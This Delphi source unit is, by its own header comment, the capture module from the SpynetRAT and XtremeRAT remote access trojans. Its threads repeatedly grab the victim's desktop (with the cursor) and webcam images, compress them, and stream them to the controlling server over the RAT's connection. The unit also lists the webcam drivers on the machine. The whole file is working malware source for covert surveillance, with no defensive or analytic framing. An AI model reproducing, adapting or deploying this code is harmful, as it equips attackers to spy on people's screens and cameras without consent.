unit UnitCapture; //Original capture functions from SpynetRAT 2.7 and XtremeRAT 3.6 sources codes

interface                                                                     

uses
  Windows, Classes, ActiveX, GDIPAPI, GDIPOBJ, GDIPUTIL, ClassesMOD, Graphics, UnitUtils,
  ZLibEx, SysUtils, uCamHelper;

type
  PCaptureInfos = ^TCaptureInfos;
  TCaptureInfos = record
    TmpList: TStringArray;
  end;

function GetDesktopImage(Quality, x, y: Integer): TMemoryStream;
function GetImageFromBMP(BmpFile: TBitmap; Quality, X, Y: Integer): TMemoryStream;
function GetWebcamDrivers: WideString;
function capGetDriverDescription(wDriverIndex: DWord; lpszName: pWideChar; cbName: Integer;
  lpszVer: pWideChar; cbVer: Integer ): Boolean; stdcall; external 'avicap32.dll' name 'capGetDriverDescriptionW';
procedure DesktopThread(p: Pointer); stdcall;
procedure WebcamThread(p: Pointer); stdcall;

var
  CaptureInfos: TCaptureInfos;
  ScreenBool, WebCamBool: Boolean;

implementation

uses
  UnitConnection, UnitCommands;

procedure DesktopThread(p: Pointer); stdcall;
var
  TmpList: TStringArray;
  Stream, TmpStream: TMemoryStream;
  i: Integer;
begin
  TmpList := PCaptureInfos(p)^.TmpList;
  i := StrToInt(TmpList[3]); //interval

  SendDatas(IntToStr(CMD_SCREEN) + '|' + IntToStr(CMD_SCREEN_START) + '|');

  repeat
    Stream := TMemoryStream.Create;
    Stream := GetDesktopImage(StrToInt(TmpList[0]), StrToInt(TmpList[1]), StrToInt(TmpList[2]));
    Stream.Position := 0;

    //compress stream before
    TmpStream := TMemoryStream.Create;
    ZCompressStream(Stream, TmpStream, zcMax);
    TmpStream.Position := 0;
    Stream.Free;

    SendDatas(IntToStr(CMD_SCREEN) + '|' + IntToStr(CMD_SCREEN_CAPTURE) + '|' +
      IntToStr(TmpStream.Size) + #0);
    MainConnection.SendStream(TmpStream, nil); //tmpstream will be free automatically

    ProcessMessages;
    if i > 0 then Sleep(i * 1000); 
  until ScreenBool = False;
  
  SendDatas(IntToStr(CMD_SCREEN) + '|' + IntToStr(CMD_SCREEN_STOP) + '|');
end;
        
procedure WebcamThread(p: Pointer); stdcall;
var
  TmpList: TStringArray;
  Stream, TmpStream: TMemoryStream;
  Bmp: TBitmap;
  i: Integer;
begin
  TmpList := PCaptureInfos(p)^.TmpList;
  i := StrToInt(TmpList[4]); //interval

  SendDatas(IntToStr(CMD_WEBCAM) + '|' + IntToStr(CMD_WEBCAM_START) + '|');

  //to avoid webcam being frozen when activing many times
  Sleep(1000);

  repeat
    Bmp := TBitmap.Create;
    if not CamHelper.GetImage(Bmp) then Break;

    Stream := TMemoryStream.Create;
    Stream := GetImageFromBMP(Bmp, StrToInt(TmpList[1]), StrToInt(TmpList[2]), StrToInt(TmpList[3]));
    Stream.Position := 0;

    //compress stream before
    TmpStream := TMemoryStream.Create;
    ZCompressStream(Stream, TmpStream, zcMax);
    TmpStream.Position := 0;
    Stream.Free;

    SendDatas(IntToStr(CMD_WEBCAM) + '|' + IntToStr(CMD_WEBCAM_CAPTURE) + '|' +
      IntToStr(TmpStream.Size) + #0);
    MainConnection.SendStream(TmpStream, nil); //tmpstream will be free automatically
                            
    ProcessMessages;
    if i > 0 then Sleep(i * 1000);
  until (WebCamBool = False) or (CamHelper.Started = False);

  CamHelper.StopCam;
  SendDatas(IntToStr(CMD_WEBCAM) + '|' + IntToStr(CMD_WEBCAM_STOP) + '|');
end;

//by wrh1d3
function GetBitmapFromWindow: HBitmap;
var
  DC, MemDC: HDC;
  Bitmap, OBitmap: HBitmap;
  BitmapWidth, BitmapHeight: Integer;
  Rect: TRect;
  Cursor: TCursorInfo;
  Window: HWND;
begin
  Window := GetDeskTopWindow;
  DC := GetDC(Window);
  MemDC := CreateCompatibleDC(DC);
  BitmapWidth := GetDeviceCaps(DC, 8);
  BitmapHeight := GetDeviceCaps(DC, 10);
  Bitmap := CreateCompatibleBitmap(DC, BitmapWidth, BitmapHeight);
  OBitmap := SelectObject(MemDC, Bitmap);
  BitBlt(MemDC, 0, 0, BitmapWidth, BitmapHeight, DC, 0, 0, SRCCOPY);

  //draw cursor position on bitmap
  Cursor.cbSize := SizeOf(Cursor);
  GetCursorInfo(Cursor);
  DrawIcon(MemDC, Cursor.ptScreenPos.X, Cursor.ptScreenPos.y, Cursor.hCursor);
  SelectObject(MemDC, OBitmap);
  DeleteDC(MemDC);
  ReleaseDC(Window, DC);
  Result := Bitmap;
end;

function SaveBitmapToStream(Stream: TMemoryStream; HBM: HBitmap): Integer;
const
  BMType = $4D42;
type
  TBitmap = record
    bmType: Integer;
    bmWidth: Integer;
    bmHeight: Integer;
    bmWidthBytes: Integer;
    bmPlanes: Byte;
    bmBitsPixel: Byte;
    bmBits: Pointer;
  end;
var
  BM: TBitmap;
  BFH: TBitmapFileHeader;
  BIP: PBitmapInfo;
  DC: HDC;
  HMem: THandle;
  Buf: Pointer;
  ColorSize, DataSize: Longint;
  BitCount: word;

  function AlignDouble(Size: Longint): Longint;
  begin
    Result := (Size + 31) div 32 * 4;
  end;
begin
  Result := 0;
  if GetObject(HBM, SizeOf(TBitmap), @BM) = 0 then Exit;
  BitCount := 32;
  if (BitCount <> 24) then ColorSize := SizeOf(TRGBQuad) * (1 shl BitCount) else ColorSize := 0;
  DataSize := AlignDouble(bm.bmWidth * BitCount) * bm.bmHeight;
  GetMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  if BIP <> nil then
  begin
    with BIP^.bmiHeader do
    begin
      biSize := SizeOf(TBitmapInfoHeader);
      biWidth := bm.bmWidth;
      biHeight := bm.bmHeight;
      biPlanes := 1;
      biBitCount := BitCount;
      biCompression := 0;
      biSizeImage := DataSize;
      biXPelsPerMeter := 0;
      biYPelsPerMeter := 0;
      biClrUsed := 0;
      biClrImportant := 0;
    end;
    with BFH do
    begin
      bfOffBits := SizeOf(BFH) + SizeOf(TBitmapInfo) + ColorSize;
      bfReserved1 := 0;
      bfReserved2 := 0;
      bfSize := longint(bfOffBits) + DataSize;
      bfType := BMType;
    end;
    HMem := GlobalAlloc(gmem_Fixed, DataSize);
    if HMem <> 0 then
    begin
      Buf := GlobalLock(HMem);
      DC := GetDC(0);
      if GetDIBits(DC, hbm, 0, bm.bmHeight, Buf, BIP^, dib_RGB_Colors) <> 0 then
      begin
        Stream.WriteBuffer(BFH, SizeOf(BFH));
        Stream.WriteBuffer(PChar(BIP)^, SizeOf(TBitmapInfo) + ColorSize);
        Stream.WriteBuffer(Buf^, DataSize);
        Result := 1;
      end;
      ReleaseDC(0, DC);
      GlobalUnlock(HMem);
      GlobalFree(HMem);
    end;
  end;

  FreeMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  DeleteObject(HBM);
end;

type
  TResizeMode = (rmDefault, rmNearest, rmBilinear, rmBicubic);

function ResizeImage(var bmp: TGPBitmap; width, Height: integer; mode: TResizeMode): Boolean;
var
  gr: TGPGraphics;
  buf: TGPBitmap;
begin
  buf := TGPBitmap.Create(Width, Height, bmp.GetPixelFormat);
  gr := TGPGraphics.Create(buf);
  case mode of
    rmDefault: ;
    rmNearest:  gr.SetInterpolationMode(InterpolationModeNearestNeighbor);
    rmBilinear: gr.SetInterpolationMode(InterpolationModeHighQualityBilinear);
    rmBicubic:  gr.SetInterpolationMode(InterpolationModeHighQualityBicubic);
  end;
  
  result := gr.DrawImage(bmp, 0, 0, Width, Height) = Ok;
  gr.Free;
  bmp.Free;
  bmp := buf;
end;

function GetImageFromBMP(BmpFile: TBitmap; Quality, X, Y: Integer): TMemoryStream;
var
  ImageBMP: TGPBitmap;
  Palette: HPALETTE;
  encoderClsid: TGUID;
  encoderParameters: TEncoderParameters;            
  transformation: TEncoderValue;
  xIs: IStream;
begin
  ImageBMP := TGPBitmap.Create(BmpFile.Handle, Palette);
  if (x <> 0) and (y <> 0) then ResizeImage(ImageBMP, x, y, rmDefault);

  GetEncoderClsid('image/jpeg', encoderClsid);
  encoderParameters.Count := 1;
  encoderParameters.Parameter[0].Guid := EncoderQuality;
  encoderParameters.Parameter[0].Type_ := EncoderParameterValueTypeLong;
  encoderParameters.Parameter[0].NumberOfValues := 1;
  encoderParameters.Parameter[0].Value := @quality;

  Result := TMemoryStream.Create;
  xIS := TStreamAdapter.Create(Result, soReference);
  ImageBMP.Save(xIS, encoderClsid, @encoderParameters);
  ImageBMP.Free;
end;

procedure SaveAndScaleScreen(quality, x, y: integer; Result: TMemoryStream;
  var StreamToSave: TMemoryStream);
var
  encoderClsid: TGUID;
  encoderParameters: TEncoderParameters;
  Image: TGPBitmap;
  xIs: IStream;
  yIs: IStream;
begin
  yIS := TStreamAdapter.Create(Result, soReference);
  Image := TGPBitmap.Create(yIs);

  if (x <> 0) and (y <> 0) then ResizeImage(Image, x, y, rmDefault);
  GetEncoderClsid('image/jpeg', encoderClsid);
  encoderParameters.Count := 1;
  encoderParameters.Parameter[0].Guid := EncoderQuality;
  encoderParameters.Parameter[0].Type_ := EncoderParameterValueTypeLong;
  encoderParameters.Parameter[0].NumberOfValues := 1;
  encoderParameters.Parameter[0].Value := @quality;

  StreamToSave.Clear;
  StreamToSave.Position := 0;

  xIS := TStreamAdapter.Create(StreamToSave, soReference);
  image.Save(xIS, encoderClsid, @encoderParameters);
  image.Free;
end;

procedure TakeCapture(Quality, x, y: integer; Result: TMemoryStream;
  var ResultStream: TMemoryStream);
begin
  Result.Position := 0;
  ResultStream.Position := 0;
  SaveAndScaleScreen(Quality, x, y, Result, ResultStream);
  ResultStream.Position := 0;
end;

procedure ScreenCapture(var Stream: TMemoryStream);
begin
  Stream.Clear;
  Stream.Position := 0;
  SaveBitmapToStream(Stream, GetBitmapFromWindow);
end;

function GetDesktopImage(Quality, x, y: Integer): TMemoryStream;
var
  Stream: TmemoryStream;
begin
  Stream := TmemoryStream.Create;
  ScreenCapture(Stream);
  Stream.position := 0;
  Result := TMemoryStream.Create;
  TakeCapture(Quality, x, y, Stream, Result);
  Stream.Free;
end;

function GetWebcamDrivers: WideString; //need this result type to get all drivers string
var
  szName, szVersion: array[0..MAX_PATH] of widechar;
  iReturn: Boolean;
  x: integer;
begin
  Result := '';
  x := 0;
  repeat
    iReturn := capGetDriverDescription(x, @szName, sizeof(szName), @szVersion, sizeof(szVersion));
    If iReturn then
    begin
      Result := Result + szName + '|';
      Inc(x);
    end;
  until iReturn = False;
end;

end.

